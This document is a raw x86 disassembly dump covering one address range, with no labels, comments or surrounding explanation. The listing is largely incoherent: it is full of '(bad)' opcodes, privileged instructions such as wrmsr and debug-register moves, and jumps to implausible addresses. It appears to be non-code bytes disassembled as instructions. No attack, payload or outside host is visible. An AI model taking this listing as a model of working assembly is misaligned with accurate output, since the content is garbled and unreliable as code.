  43023f:	add    BYTE PTR [ecx],al
  430241:	test   DWORD PTR [eax],eax
  430243:	wrmsr  
  430245:	ja     0x430242
  430247:	add    BYTE PTR [eax],al
  430249:	mov    eax,DWORD PTR [ebp-0x747f8a04]
  43024f:	add    esp,edi
  430251:	add    BYTE PTR [eax+0x450108],al
  430257:	mov    edi,DWORD PTR [ebp-0x6c]
  43025a:	add    DWORD PTR [eax],0x4
  43025d:	mov    eax,DWORD PTR [ebp+0x3]
  430260:	mov    edi,DWORD PTR [esp+edi*8]
  430263:	dec    ebp
  430264:	nop
  430265:	mov    eax,DWORD PTR [ecx]
  430267:	fadd   DWORD PTR [eax]
  430269:	add    BYTE PTR [ecx*4-0xafa000],dl
  430270:	inc    ebp
  430271:	push   edx
  430272:	call   DWORD PTR [ebp-0x7b]
  430275:	mov    esi,DWORD PTR [ebp-0x74]
  430278:	mov    eax,DWORD PTR [eax]
  43027a:	cld    
  43027b:	mov    eax,DWORD PTR [eax+0x880103]
  430281:	add    BYTE PTR [ebp+0x6a],bh
  430284:	cmp    edi,0x10
  430287:	mov    WORD PTR [ebp+0x0],es
  43028a:	mov    edx,DWORD PTR [edx-0x4]
  43028d:	push   ecx
  43028e:	nop
  43028f:	inc    DWORD PTR [ecx]
  430291:	cld    
  430292:	add    BYTE PTR [ebp-0x16],bh
  430295:	mov    eax,DWORD PTR [eax]
  430297:	cld    
  430298:	push   eax
  430299:	nop
  43029a:	inc    ebp
  43029b:	add    edi,edi
  43029d:	add    BYTE PTR [ebx+0x4de2f445],cl
  4302a3:	jmp    0xe33b:0x9403c733
  4302aa:	movntq QWORD PTR [edx],mm7
  4302ad:	mov    DWORD PTR [eax],0xb87e8b98
  4302b3:	test   ebx,eax
  4302b5:	jmp    DWORD PTR [ebp-0x1]
  4302b8:	int    0xed
  4302ba:	sub    esp,esi
  4302bc:	add    eax,DWORD PTR [ebp-0x30]
  4302bf:	fild   WORD PTR [ebp+0x3f]
  4302c2:	cmp    eax,edi
  4302c4:	je     0xc043e8ea
  4302ca:	mov    DWORD PTR [ebp-0x28],0xdb00eb
  4302d1:	(bad)  
  4302d2:	jne    0x430260
  4302d4:	mov    ebx,ebp
  4302d6:	cld    
  4302d7:	jle    0x43031e
  4302d9:	dec    ecx
  4302da:	mov    eax,DWORD PTR [eax]
  4302dc:	mov    ah,0x50
  4302de:	add    BYTE PTR [ebp-0x18],al
  4302e1:	mov    ebp,DWORD PTR [ecx]
  4302e3:	test   al,0x0
  4302e5:	add    BYTE PTR [ebx-0x7f170301],cl
  4302eb:	add    DWORD PTR es:[eax],eax
  4302ee:	add    al,al
  4302f0:	xor    BYTE PTR [eax+0x4f],dl
  4302f3:	inc    ebp
  4302f4:	add    BYTE PTR [ebx+0xfcd88b],cl
  4302fa:	mov    DWORD PTR [ebx-0x3fff03ff],ecx
  430300:	add    DWORD PTR [ecx+0x458be845],ecx
  430306:	fmul   DWORD PTR [ebx+0x8bb800]
  43030c:	cld    
  43030d:	call   0xd82dd2
  430312:	dec    DWORD PTR [ebx+0x109ee8ff]
  430318:	add    al,al
  43031a:	push   eax
  43031b:	es inc ebp
  43031d:	inc    ebp
  43031e:	mov    ecx,DWORD PTR [ebx+0xd89c]
  430324:	dec    DWORD PTR [ebx-0x3ff70301]
  43032a:	mov    DWORD PTR gs:[eax],eax
  43032d:	call   0x8c134867
  430332:	sar    BYTE PTR [eax-0x17baffd8],0x8b
  430339:	sub    eax,ebx
  43033b:	add    BYTE PTR [eax],al
  43033d:	mov    ecx,DWORD PTR [ebx-0x3fef0318]
  430343:	inc    ebp
  430344:	push   ebp
  430345:	mov    ebp,eax
  430347:	shr    BYTE PTR [ecx],1
  430349:	ret    
  43034a:	add    dh,al
  43034c:	mov    eax,ecx
  43034e:	cld    
  43034f:	test   BYTE PTR [eax+0x101],al
  430355:	inc    ebp
  430356:	xor    BYTE PTR [ebx],dh
  430358:	push   edi
  430359:	mov    ecx,0xffe48d89
  43035e:	inc    ebp
  43035f:	enter  0x4d8b,0xfc
  430363:	mov    eax,ebx
  430365:	or     BYTE PTR [ebx+0x38732c1],bl
  43036b:	add    DWORD PTR [ebp-0xbac000],ecx
  430371:	add    al,ch
  430373:	add    BYTE PTR [ecx],ch
  430375:	inc    DWORD PTR [eax]
  430377:	cld    
  430378:	mov    edi,DWORD PTR [ebp-0xc]
  43037b:	mov    esi,DWORD PTR [ebp-0x4]
  43037e:	xor    edx,DWORD PTR [eax+0x8d0103]
  430384:	and    BYTE PTR [ebp+0x50e800ff],bl
  43038a:	sub    DWORD PTR [ebp+0x0],eax
  43038d:	mov    edi,edi
  43038f:	test   al,0xe4
  430391:	add    BYTE PTR [ebp-0x1],cl
  430394:	xor    ebp,eax
  430396:	add    esp,DWORD PTR [esi]
  430398:	cmp    eax,DWORD PTR [eax]
  43039a:	jne    0x4303e9
  43039c:	(bad)  
  43039d:	mov    ebx,eax
  43039f:	pushf  
  4303a0:	add    BYTE PTR [eax],al
  4303a2:	add    BYTE PTR [ecx-0x37474bb],cl
  4303a8:	or     BYTE PTR [eax+0x8401c3],bh
  4303ae:	fwait
  4303af:	jne    0x4303e3
  4303b1:	xor    ecx,DWORD PTR [ecx+0x457c088d]
  4303b7:	inc    DWORD PTR [ebp-0x74d68b18]
  4303bd:	add    BYTE PTR [eax+0x33fc4d8b],bh
  4303c3:	or     BYTE PTR [ebp+0x72000801],0x30
  4303ca:	add    BYTE PTR [edi+0x45],dl
  4303cd:	or     DWORD PTR [ebx-0x3c95471c],0xffffffff
  4303d4:	gs test ebp,ecx
  4303d7:	je     0x430404
  4303d9:	mov    eax,DWORD PTR [ebx]
  4303db:	cld    
  4303dc:	sar    BYTE PTR [eax+0x3b0145],1
  4303e2:	pcmpeqw mm4,mm2
  4303e5:	xor    edi,edi
  4303e7:	lea    ecx,[ebx-0x23927470]
  4303ed:	add    BYTE PTR [ebp+0x50],cl
  4303f0:	cmp    eax,DWORD PTR [ebp+0x75]
  4303f3:	mov    ebp,DWORD PTR [eax-0x68]
  4303f6:	test   DWORD PTR [eax],eax
  4303f8:	clc    
  4303f9:	push   DWORD PTR [ebp-0x1]
  4303fc:	lea    ecx,[eax]
  4303fe:	int3   
  4303ff:	inc    ebp
  430400:	call   0xfb3590
  430405:	jne    0x4303ff
  430407:	xor    edi,DWORD PTR [ebp-0x41]
  43040a:	jmp    0x43047e
  43040c:	mov    eax,DWORD PTR [eax]
  43040e:	mov    eax,0x339545c7
  430413:	inc    DWORD PTR [ebx]
  430415:	push   DWORD PTR [ecx]
  430417:	inc    ecx
  430418:	mov    eax,DWORD PTR [eax]
  43041a:	jmp    0x43046c
  43041c:	mov    eax,DWORD PTR [ebp-0x3c]
  43041f:	mov    eax,eax
  430421:	cld    
  430422:	clc    
  430423:	ret    
  430424:	test   bh,al
  430426:	pop    es
  430427:	xchg   ebp,eax
  430428:	add    bh,bh
  43042a:	inc    ebp
  43042b:	dec    DWORD PTR [edi]
  43042d:	sub    ebp,DWORD PTR [ebx]
  43042f:	add    BYTE PTR [eax],al
  430431:	push   eax
  430432:	jbe    0x430489
  430434:	mov    cl,BYTE PTR [ebx-0x34e00b80]
  43043a:	or     al,0xcf
  43043c:	inc    eax
  43043d:	enter  0x745,0x72
  430441:	inc    ebp
  430442:	mov    eax,DWORD PTR [ecx]
  430444:	int3   
  430445:	add    BYTE PTR [ebp-0x75],al
  430448:	xor    DWORD PTR [eax+0x33c74d9c],edi
  43044e:	ror    BYTE PTR [ebp+0x72f80885],1
  430454:	inc    ebp
  430455:	add    BYTE PTR [ebx-0x3c7423bb],cl
  43045b:	fadd   st,st(6)
  43045d:	rol    BYTE PTR [ebp+0x12],0x8b
  430461:	inc    ebp
  430462:	fmul   QWORD PTR [ebx-0x3c39233d]
  430468:	inc    ebp
  430469:	test   bh,al
  43046b:	fwait
  43046c:	clc    
  43046d:	xor    al,BYTE PTR [ebp+0x45dcf889]
  430473:	inc    ebp
  430474:	xor    esi,DWORD PTR [ebx]
  430476:	pushf  
  430477:	mov    ecx,0xffb48dc7
  43047c:	test   eax,ecx
  43047e:	clc    
  43047f:	dec    ebp
  430480:	inc    ebp
  430481:	mov    edi,DWORD PTR ds:0xc7c19c08
  430487:	xchg   BYTE PTR [esi+edi*8-0x807007b],ah
  43048e:	inc    ebp
  43048f:	inc    ebp
  430490:	aas    
  430491:	mov    ebx,DWORD PTR [eax+ecx*1+0x18e8c8c7]
  430498:	test   DWORD PTR [ecx],esi
  43049a:	clc    
  43049b:	pushf  
  43049c:	inc    ebp
  43049d:	dec    DWORD PTR [ebx-0x3cba0f04]
  4304a3:	push   eax
  4304a4:	mov    BYTE PTR [edx],0x7d
  4304a7:	add    BYTE PTR [ebx],bh
  4304a9:	mov    ecx,DWORD PTR [edi]
  4304ab:	mov    DWORD PTR [eax],ebx
  4304ad:	les    eax,FWORD PTR [eax]
  4304af:	adc    ebp,ecx
  4304b1:	dec    ebp
  4304b2:	add    DWORD PTR [ebx-0x34ba3c00],ecx
  4304b8:	mov    ecx,esi
  4304ba:	lock or al,cl
  4304bd:	clc    
  4304be:	inc    ebp
  4304bf:	add    esi,DWORD PTR [ebx]
  4304c1:	jge    0x4304c6
  4304c3:	xor    edi,DWORD PTR [ebx]
  4304c5:	cmp    ecx,DWORD PTR [edi]
  4304c7:	paddb  mm1,QWORD PTR [eax+eax*1+0x0]
  4304cc:	mov    edi,DWORD PTR [ecx]
  4304ce:	test   al,0xcc
  4304d0:	dec    ebp
  4304d1:	test   BYTE PTR [ebx],dh
  4304d3:	pop    es
  4304d4:	xor    eax,DWORD PTR [eax]
  4304d6:	add    ecx,DWORD PTR [esi]
  4304d8:	add    ecx,eax
  4304da:	psraw  mm0,mm1
  4304dd:	sub    BYTE PTR [ebp+0x38],cl
  4304e0:	mov    edi,DWORD PTR [ebx]
  4304e2:	lock int3 
  4304e4:	shl    edx,1
  4304e6:	rol    BYTE PTR [ebp+0xc],1
  4304e9:	mov    DWORD PTR [ebp-0x24],0xf8038533
  4304f0:	jmp    0x75053a
  4304f5:	pushf  
  4304f6:	inc    ebp
  4304f7:	mov    DWORD PTR [ebx-0x3cba0710],ecx
  4304fd:	xor    ecx,ebx
  4304ff:	add    ecx,esi
  430501:	mov    esi,eax
  430503:	enter  0x45af,0x8b
  430507:	xor    ecx,eax
  430509:	add    edx,DWORD PTR [ebp-0x77]
  43050c:	sub    ecx,DWORD PTR [eax]
  43050e:	cmp    eax,DWORD PTR [ebp+0x77]
  430511:	ror    DWORD PTR [ebx-0x76385764],1
  430517:	test   al,0x0
  430519:	test   DWORD PTR [ebx+0x4d45acf8],ecx
  43051f:	cmp    al,0x33
  430521:	pushf  
  430522:	xor    eax,edi
  430524:	add    ebp,DWORD PTR [ebx+eax*1-0x3e07f07b]
  43052b:	inc    ebp
  43052c:	dec    ebp
  43052d:	mov    ebx,DWORD PTR ds:[eax+esi*8-0x2f432e39]
  430535:	test   DWORD PTR ds:0xeb4545f8,eax
  43053b:	cmp    BYTE PTR [ebx+0x4d8ba49c],cl
  430541:	fdiv   QWORD PTR [ebx]
  430543:	dec    ebp
  430544:	xor    esi,DWORD PTR [ebx]
  430546:	add    eax,DWORD PTR [ebx]
  430548:	add    ecx,DWORD PTR [ecx-0x373e4ff1]
  43054e:	dec    ebp
  43054f:	test   BYTE PTR [ebx-0x2eff0ffe],cl
  430555:	out    dx,eax
  430556:	rol    BYTE PTR [eax],1
  430558:	add    eax,0xebc8458b
  43055d:	dec    ebp
  43055e:	mov    ebp,DWORD PTR [ebx]
  430560:	mov    esp,0x33f84d8b
  430565:	ret    
  430566:	xor    eax,esi
  430568:	add    ecx,eax
  43056a:	add    eax,DWORD PTR [edx+0xc1010f]
  430570:	dec    ebp
  430571:	inc    ebp
  430572:	mov    ecx,DWORD PTR [ebx-0x3c2e0710]
  430578:	ror    bl,1
  43057a:	add    eax,0xebc645ce
  43057f:	scas   eax,DWORD PTR es:[edi]
  430580:	mov    ecx,DWORD PTR [ebx+0x554dc8e8]
  430586:	xor    ebp,DWORD PTR [ebx]
  430588:	xor    edi,DWORD PTR [ebx]
  43058a:	add    esi,DWORD PTR [edi+0x3]
  43058d:	mov    ecx,DWORD PTR [edi]
  43058f:	clc    
  430590:	rol    ebx,0x4d
  430593:	(bad)  
  430594:	mov    edi,DWORD PTR [eax+esi*8-0x2f742f00]
  43059b:	mov    ah,0x45
  43059d:	dec    ebp
  43059e:	jbe    0x4305d3
  4305a0:	mov    esi,DWORD PTR [ebx]
  4305a2:	call   0x334652aa
  4305a7:	rdpmc  
  4305a9:	rol    DWORD PTR [ebx],0x4d
  4305ac:	add    ecx,DWORD PTR [ebx-0x2e3e0ff1]
  4305b2:	inc    ebp
  4305b3:	ror    BYTE PTR [ebx+0x45450808],1
  4305b9:	jmp    0x10b0649
  4305be:	inc    ebp
  4305bf:	inc    ebp
  4305c0:	(bad)  
  4305c1:	mov    ebx,eax
  4305c3:	clc    
  4305c4:	test   ebx,eax
  4305c6:	clc    
  4305c7:	retf   
  4305c8:	inc    ebp
  4305c9:	into   
  4305ca:	mov    esi,0x8b85afec
  4305d0:	clc    
  4305d1:	enter  0x5545,0x33
  4305d5:	sub    ebx,DWORD PTR [ebx+edi*1-0x74278875]
  4305dc:	ret    
  4305dd:	mov    ah,0xc6
  4305df:	addr16 push 0x338b4545
  4305e5:	clc    
  4305e6:	add    eax,ebx
  4305e8:	loopne 0x4305b5
  4305ea:	dec    ebp
  4305eb:	into   
  4305ec:	mov    al,dh
  4305ee:	or     BYTE PTR [edi-0x37ff748e],ch
  4305f4:	inc    ebp
  4305f5:	push   ebp
  4305f6:	mov    ebp,DWORD PTR [ebx]
  4305f8:	in     al,dx
  4305f9:	cmp    eax,ebx
  4305fb:	ja     0x430642
  4305fd:	mov    ecx,DWORD PTR [ebx-0x7bba2354]
  430603:	inc    ebp
  430604:	fwait
  430605:	mov    esi,DWORD PTR [edx]
  430607:	clc    
  430608:	mov    bl,al
  43060a:	xlat   BYTE PTR ds:[ebx]
  43060b:	retf   
  43060c:	inc    ebp
  43060d:	into   
  43060e:	mov    eax,esi
  430610:	in     al,dx
  430611:	scas   eax,DWORD PTR es:[edi]
  430612:	retf   
  430613:	mov    ecx,DWORD PTR [ebp-0x38]
  430616:	mov    edx,DWORD PTR [ebp-0x24]
  430619:	sub    eax,DWORD PTR [ebx+edi*1-0x74cd8865]
  430620:	mov    ah,BYTE PTR [edi+edx*8+0x33454d23]
  430627:	mov    eax,DWORD PTR [ebx]
  430629:	clc    
  43062a:	loopne 0x4305ef
  43062c:	push   ebp
  43062d:	retf   
  43062e:	mov    dh,al
  430630:	adc    esi,ecx
  430632:	jb     0x4305e3
  430634:	add    BYTE PTR [ebx+0x558bc845],cl
  43063a:	in     al,dx
  43063b:	sub    eax,ebx
  43063d:	cmp    ecx,ebx
  43063f:	mov    eax,esi
  430641:	mov    esp,0x45af03ce
  430646:	add    ecx,DWORD PTR [ebx-0x34ba0720]
  43064c:	mov    eax,ebx
  43064e:	in     al,dx
  43064f:	into   
  430650:	dec    ebp
  430651:	(bad)  
  430652:	xor    ebp,DWORD PTR [edi+0x80f8903]
  430658:	rol    DWORD PTR [ebp+0x4d],0x89
  43065c:	xor    esp,esp
  43065e:	sub    eax,DWORD PTR [ebp-0x75]
  430661:	add    ebp,esp
  430663:	mov    al,0x55
  430665:	inc    ebp
  430666:	xor    esi,DWORD PTR [ecx]
  430668:	add    ebx,DWORD PTR [edi+ecx*1+0x55dcca89]
  43066f:	inc    ebp
  430670:	xor    esi,DWORD PTR [edx]
  430672:	sub    ebx,DWORD PTR [ebp+ecx*4+0x72c011c7]
  430679:	test   DWORD PTR [eax],eax
  43067b:	clc    
  43067c:	enter  0x8645,0x33
  430680:	inc    DWORD PTR [ebx]
  430682:	(bad)  
  430683:	jmp    0x4306ca
  430685:	mov    ecx,DWORD PTR [ebx-0x3c3c1b28]
  43068b:	inc    ebp
  43068c:	(bad)  
  43068d:	mov    ebp,DWORD PTR [edi-0x277b7424]
  430693:	fwait
  430694:	retf   
  430695:	xor    al,cl
  430697:	mov    BYTE PTR [ebp+0xb],cl
  43069a:	lea    eax,[ebp+0x8]
  43069d:	xor    esi,DWORD PTR [edx+0x3]
  4306a0:	add    al,ah
  4306a2:	inc    ebp
  4306a3:	dec    ebp
  4306a4:	mov    ecx,DWORD PTR [edx+0x72c308d0]
  4306aa:	gs add ch,cl
  4306ad:	inc    ebp
  4306ae:	sub    ecx,DWORD PTR [edx+0x4df00b03]
  4306b4:	inc    ebp
  4306b5:	xor    ecx,DWORD PTR [ebx-0x3c1f37fd]
  4306bb:	push   ebp
  4306bc:	(bad)  
  4306bd:	mov    BYTE PTR [edi+0xf723b11],ch
  4306c3:	add    ch,ch
  4306c5:	inc    ebp
  4306c6:	dec    DWORD PTR [ebx-0x34332775]
  4306cc:	add    al,0x4d
  4306ce:	inc    ebp
  4306cf:	mov    ecx,DWORD PTR [ebx-0x7f7b0324]
  4306d5:	fwait
  4306d6:	add    DWORD PTR [edx],esi
  4306d8:	add    BYTE PTR [ebx+0x4d00c000],cl
  4306de:	push   DWORD PTR [ebx]
  4306e0:	int3   
  4306e1:	xor    eax,DWORD PTR [eax]
  4306e3:	add    edx,DWORD PTR [eax+0x3]
  4306e6:	mov    DWORD PTR [edi],ecx
  4306e8:	call   0x4288c7ae
  4306ed:	mov    DWORD PTR [ebp-0x20],esp
  4306f0:	add    BYTE PTR [ebp+0x7d],al
  4306f3:	mov    eax,DWORD PTR [eax]
  4306f5:	in     al,0x15
  4306f7:	ret    
  4306f8:	iret   
  4306f9:	(bad)  
  4306fa:	enter  0x14af,0x8b
  4306fe:	(bad)  
  4306ff:	in     al,dx
  430700:	or     bl,cl
  430702:	adc    cl,al
  430704:	push   ebp
  430705:	dec    ebp
  430706:	inc    eax
  430707:	mov    edx,DWORD PTR [ebp-0x20]
  43070a:	jb     0x4306d7
  43070c:	mov    ecx,esi
  43070e:	cld    
  43070f:	scas   eax,DWORD PTR es:[edi]
  430710:	or     BYTE PTR [ebx-0x2cff27ff],0x0
  430717:	mov    BYTE PTR [eax],0x8c
  43071a:	push   0xffffff9b
  43071c:	push   edi
  43071d:	xor    dl,BYTE PTR [eax+0x3b]
  430720:	mov    ecx,DWORD PTR [edi]
  430722:	call   0x8c424c85
  430727:	mov    eax,eax
  430729:	in     al,dx
  43072a:	jge    0x430779
  43072c:	mov    DWORD PTR [ebx],esi
  43072e:	int3   
  43072f:	add    eax,DWORD PTR [ebp+0xf]
  430732:	xor    eax,ecx
  430734:	(bad)  
  430735:	dec    ebp
  430736:	pushf  
  430737:	xor    ecx,esi
  430739:	add    edi,DWORD PTR [edi]
  43073b:	mov    eax,DWORD PTR [ebp-0x38]
  43073e:	(bad)  
  43073f:	test   dh,dl
  430741:	fwait
  430742:	add    esi,DWORD PTR [edx]
  430744:	jmp    0x4306cf
  430746:	mov    cl,al
  430748:	add    eax,0x14330f45
  43074d:	mov    ecx,0xff468d80
  430752:	jmp    0xc990171f
  430757:	mov    edx,ecx
  430759:	rol    BYTE PTR [ebp+0x330155],1
  43075f:	add    ecx,DWORD PTR [ebp+0xf]
  430762:	xor    eax,edx
  430764:	(bad)  
  430765:	ror    DWORD PTR [eax],0x86
  430768:	jb     0x430767
  43076a:	add    bh,bh
  43076c:	clc    
  43076d:	inc    ebp
  43076e:	jb     0x4307da
  430770:	mov    ecx,DWORD PTR [ecx+0x4545c008]
  430776:	xor    DWORD PTR [ebx+0xc7d89c],ecx
  43077c:	shr    BYTE PTR [eax-0x3d],0x30
  430780:	clc    
  430781:	add    BYTE PTR [ebp+0x75],al
  430784:	xor    DWORD PTR [edx-0x64],ebp
  430787:	inc    edi
  430789:	adc    al,0xe8
  43078b:	inc    ebp
  43078c:	test   DWORD PTR [ebp-0x7cba8b08],eax
  430792:	mov    ecx,DWORD PTR [eax]
  430794:	cld    
  430795:	or     DWORD PTR [ebp-0x34],0x33
  430799:	jbe    0x43079e
  43079b:	mov    edx,DWORD PTR [ecx+0x2b]
  43079e:	dec    ebp
  43079f:	mov    cl,BYTE PTR [ebx+0x45d801]
  4307a5:	mov    BYTE PTR [ebx],dh
  4307a7:	mov    eax,DWORD PTR [ebx]
  4307a9:	or     BYTE PTR [ecx+0x3b],dl
  4307ac:	dec    ebp
  4307ad:	int3   
  4307ae:	xor    ebp,edi
  4307b0:	add    eax,DWORD PTR [ebp+0x51]
  4307b3:	mov    ecx,DWORD PTR [ebp-0x28]
  4307b6:	xor    eax,DWORD PTR [eax]
  4307b8:	add    ebp,DWORD PTR [eax+0x51]
  4307bb:	adc    BYTE PTR [eax+0x0],0x8b
  4307bf:	add    BYTE PTR [ebx+0x4d18fcff],cl
  4307c5:	inc    ebp
  4307c6:	mov    ecx,DWORD PTR [ecx+0x4500c4d8]
  4307cc:	xor    ecx,DWORD PTR [ebx+0x4551c403]
  4307d2:	dec    ebp
  4307d3:	mov    esi,DWORD PTR [ebx]
  4307d5:	hlt    
  4307d6:	add    eax,ebx
  4307d8:	push   ecx
  4307d9:	inc    ebp
  4307da:	dec    ebp
  4307db:	(bad)  
  4307dc:	call   esi
  4307de:	in     al,0xc7
  4307e0:	retf   
  4307e1:	mov    al,ds:0xc5ff3dce
  4307e6:	adc    al,0xc6
  4307e8:	inc    ebp
  4307e9:	and    eax,0x9c0f4c85
  4307ee:	cmp    DWORD PTR [esi-0xe7ac800],0xf
  4307f5:	cmp    BYTE PTR [ebx+0x38],0x0
  4307f9:	mov    dh,0xc7
  4307fb:	cmp    eax,eax
  4307fd:	jne    0x45440049
  430803:	mov    esi,DWORD PTR [ebx]
  430805:	mov    eax,0x848bcb9c
  43080a:	rcr    BYTE PTR [ebx-0x7c7fcd0f],0x65
  430811:	or     BYTE PTR [edi],cl
  430813:	(bad)  
  430814:	dec    ebp
  430815:	inc    edi
  430816:	add    bh,0x54
  430819:	or     cl,ch
  43081b:	test   DWORD PTR [eax+0x4d4501f8],ecx
  430821:	add    BYTE PTR [eax-0x1638ab64],0xbc
  430828:	mov    BYTE PTR [ebp+0x45a5f802],dh
  43082e:	(bad)  
  43082f:	cmp    eax,0x89839cff
  430834:	je     0x43081a
  430836:	inc    DWORD PTR [ebp+0x0]
  430839:	mov    ecx,DWORD PTR [ebp-0x340018]
  43083f:	into   
  430840:	dec    DWORD PTR [ebx-0x7f72431c]
  430846:	push   0x5000ff01
  43084b:	retf   
  43084c:	inc    ebp
  43084d:	into   
  43084e:	dec    DWORD PTR [ebx-0x343f3ff4]
  430854:	push   eax
  430855:	into   
  430856:	call   0x4b0ce6
  43085b:	retf   
  43085c:	add    dh,cl
  43085e:	add    bh,bh
  430860:	mov    DWORD PTR [eax+ecx*1],edx
  430863:	clc    
  430864:	inc    ebp
  430865:	inc    ebp
  430866:	mov    ecx,DWORD PTR [ebx-0x7fff1728]
  43086c:	push   0x1
  43086e:	push   edi
  43086f:	add    BYTE PTR [eax-0x35],dl
  430872:	mov    ecx,esi
  430874:	cld    
  430875:	mov    ecx,DWORD PTR [ecx+0xcb01bc]
  43087b:	into   
  43087c:	ror    BYTE PTR [ebx+0x75000800],0x50
  430883:	xor    eax,DWORD PTR [ebp+0x3]
  430886:	jne    0x4308d9
  430888:	call   DWORD PTR [eax-0x3c]
  43088b:	mov    DWORD PTR [ecx-0x18],edx
  43088e:	mov    edi,edi
  430890:	call   0x8b464e19
  430895:	add    ah,ah
  430897:	rol    BYTE PTR [ebp-0x7c],0xeb
  43089b:	add    edi,edi
  43089d:	add    al,ch
  43089f:	inc    ebp
  4308a0:	push   ecx
  4308a1:	cmp    al,0x8b
  4308a3:	pushf  
  4308a4:	(bad)  
  4308a5:	mov    DWORD PTR [ebp-0x50],0xf8e485c7
  4308ac:	test   DWORD PTR [ebp-0x8],ecx
  4308af:	add    BYTE PTR [ebp+0x54],0x32
  4308b3:	jmp    0x8bcc9154
  4308b8:	in     al,dx
  4308b9:	or     BYTE PTR [ebp-0xf],al
  4308bc:	xor    eax,DWORD PTR [eax+0x4f896503]
  4308c2:	hlt    
  4308c3:	mov    eax,DWORD PTR [ebp-0x50]
  4308c6:	xor    esi,ecx
  4308c8:	add    eax,DWORD PTR [eax+0x4f086589]
  4308ce:	inc    ebp
  4308cf:	adc    ecx,0x68
  4308d2:	pushf  
  4308d3:	inc    edi
  4308d5:	add    al,ch
  4308d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4308d8:	test   edi,edi
  4308da:	clc    
  4308db:	inc    DWORD PTR [ebp-0x73]
  4308de:	cmp    al,0x74
  4308e0:	pushf  
  4308e1:	inc    edi
  4308e3:	push   ecx
  4308e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4308e5:	jne    0x43086c
  4308e7:	push   eax
  4308e8:	clc    
  4308e9:	test   DWORD PTR [ebp-0x1],eax
  4308ec:	call   FWORD PTR ds:[ebx+ecx*4+0x70b4c4c7]
  4308f4:	test   DWORD PTR [ebx+0x574510f8],eax
  4308fa:	cmp    BYTE PTR [edx],bl
  4308fc:	pushf  
  4308fd:	add    BYTE PTR [ebx+0x4d80e468],cl
  430903:	add    BYTE PTR [ebx],dh
  430905:	inc    ebp
  430906:	add    ecx,DWORD PTR [ebx-0x7f3f0377]
  43090c:	enter  0x8401,0x0
  430910:	add    al,BYTE PTR [eax]
  430912:	add    bh,bh
  430914:	out    dx,eax
  430915:	sbb    BYTE PTR [eax],al
  430917:	dec    ebp
  430918:	mov    ecx,DWORD PTR [ebx+0x4dd8f4]
  43091e:	sub    esi,DWORD PTR [ebx]
  430920:	mov    ebp,DWORD PTR [eax-0x8]
  430923:	add    bl,0x0
  430926:	(bad)  
  430927:	cmp    eax,ecx
  430929:	or     BYTE PTR [edx+0x750114],al
  43092f:	inc    DWORD PTR [ebp+0x18]
  430932:	mov    eax,DWORD PTR [ebp-0x8]
  430935:	mov    ebx,eax
  430937:	(bad)  
  430938:	retf   
  430939:	inc    ebp
  43093a:	into   
  43093b:	mov    esi,eax
  43093d:	int3   
  43093e:	scas   eax,DWORD PTR es:[edi]
  43093f:	push   es
  430940:	mov    esi,DWORD PTR [ebp-0xc]
  430943:	call   DWORD PTR [ebp+0x18]
  430946:	sub    edi,DWORD PTR [ebp+0x3b]
  430949:	mov    esi,DWORD PTR [edi-0x34]
  43094c:	mov    eax,DWORD PTR [ebp-0x8]
  43094f:	xor    ebx,eax
  430951:	pushf  
  430952:	mov    bh,0xbc
  430955:	fadd   QWORD PTR [eax]
  430957:	test   DWORD PTR [ebx+0x4d45bcf8],ecx
  43095d:	mov    esi,DWORD PTR [ebx]
  43095f:	in     al,0x33
  430961:	ret    
  430962:	add    eax,esi
  430964:	add    eax,DWORD PTR [ebp+0xf]
  430967:	mov    eax,ecx
  430969:	in     al,0x4d
  43096b:	ret    
  43096c:	mov    eax,esi
  43096e:	in     al,dx
  43096f:	inc    ebp
  430970:	rol    edi,1
  430972:	sar    al,1
  430974:	or     BYTE PTR [ebp+0x45e9f845],al
  43097a:	add    BYTE PTR [ebx],dh
  43097c:	add    BYTE PTR [ebp+eax*2-0x7437439],bl
  430983:	test   ebx,eax
  430985:	clc    
  430986:	retf   
  430987:	inc    ebp
  430988:	into   
  430989:	cmp    eax,0xc7af9cc6
  43098e:	mov    ebp,DWORD PTR [esp+esi*8+0x2bf85585]
  430995:	inc    ebp
  430996:	cmp    edi,DWORD PTR [edi]
  430998:	ja     0x430936
  43099a:	mov    eax,edi
  43099c:	mov    esp,0x458567a8
  4309a1:	clc    
  4309a2:	mov    eax,DWORD PTR [ebp-0x8]
  4309a5:	mov    eax,ebx
  4309a7:	in     al,dx
  4309a8:	retf   
  4309a9:	ret    
  4309aa:	into   
  4309ab:	mov    dh,0x7d
  4309ae:	scas   eax,DWORD PTR es:[edi]
  4309af:	cmp    ecx,DWORD PTR [ebx+0x5518f40f]
  4309b5:	add    BYTE PTR [ebx],ch
  4309b7:	jmp    0xba0af7
  4309bc:	mov    eax,DWORD PTR [ebp-0x5c]
  4309bf:	mov    eax,DWORD PTR [ebp-0x14]
  4309c2:	inc    ebp
  4309c3:	enter  0x458b,0xf8
  4309c7:	xor    eax,ebx
  4309c9:	add    ecx,ebx
  4309cb:	cmp    ecx,esi
  4309cd:	shufps xmm7,xmm4,0xaf
  4309d1:	add    BYTE PTR [ebx+0x55e8f48b],cl
  4309d7:	dec    ebp
  4309d8:	sub    esi,DWORD PTR [ebx]
  4309da:	cmp    esi,DWORD PTR [ebx]
  4309dc:	ja     0x4309e1
  4309de:	mov    eax,DWORD PTR [ebx]
  4309e0:	lods   al,BYTE PTR ds:[esi]
  4309e1:	mov    db0,ecx
  4309e4:	inc    ebp
  4309e5:	dec    ebp
  4309e6:	mov    ecx,DWORD PTR [ebx-0x2e3c1308]
  4309ec:	retf   
  4309ed:	rol    dh,1
  4309ef:	or     al,0xce
  4309f1:	inc    ebp
  4309f2:	scas   eax,DWORD PTR es:[edi]
  4309f3:	xor    ecx,DWORD PTR [ebx+0x55e9f403]
  4309f9:	add    BYTE PTR [ebx],ch
  4309fb:	add    BYTE PTR [ebx],bh
  4309fd:	inc    ebp
  4309fe:	mov    ecx,DWORD PTR [ebx-0x3cfc074c]
  430a04:	inc    ebp
  430a05:	retf   
  430a06:	mov    ecx,esi
  430a08:	clc    
  430a09:	(bad)  
  430a0a:	retf   
  430a0b:	scas   eax,DWORD PTR es:[edi]
  430a0c:	ret    
  430a0d:	mov    ecx,esi
  430a0f:	hlt    
  430a10:	(bad)  
  430a11:	push   ebp
  430a12:	scas   eax,DWORD PTR es:[edi]
  430a13:	sub    ecx,DWORD PTR [ecx+0x4577083b]
  430a19:	mov    ecx,DWORD PTR [ecx+0x4589e4e8]
